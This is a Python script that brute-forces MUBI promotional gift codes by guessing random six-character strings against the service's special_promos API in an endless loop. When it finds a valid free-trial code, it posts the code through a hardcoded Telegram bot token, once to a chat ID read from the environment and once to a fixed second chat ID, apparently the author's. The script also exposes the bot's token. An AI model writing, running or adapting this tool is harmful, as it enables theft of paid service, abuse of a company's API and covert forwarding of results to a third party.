import random, string
import requests as re
import time
import os 
hc = os.environ.get("HITS")
#https://mubi.com/services/api/special_promos/VX7HYV
i = 0 
f =0
while f==i:
  res = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 6))
  #res = input('Enter GC')
  respo = re.get("https://mubi.com/services/api/special_promos/" + res)
  if '"free_trial_period":360' in respo.text:
      hit = ("『ꪜ』SAYONARA 『ꪜ』\n ≈360 MUBI GC HIT≈\n ★GIFT CODE →   " +res)
      i = i+1
      re.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id='+hc+'&text='+hit)
      re.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id=1154075796&text='+hit)
  elif '"free_trial_period":90' in respo.text:
      hit = ("『ꪜ』SAYONARA 『ꪜ』\n ≈90 MUBI GC HIT≈\n ★GIFT CODE →   " +res)
      i = i+1
      re.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id='+hc+'&text='+hit)
      re.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id=1154075796&text='+hit)
  elif '"free_trial_period":30' in respo.text:
      hit = ("『ꪜ』SAYONARA 『ꪜ』\n ≈30 MUBI GC HIT≈\n ★GIFT CODE →   " +res)
      i = i+1
      re.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id='+hc+'&text='+hit)
      re.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id=1154075796&text='+hit)
  else:
      print ("BAD " + res)
      i = i
      time.sleep(2)
  print(respo.text)
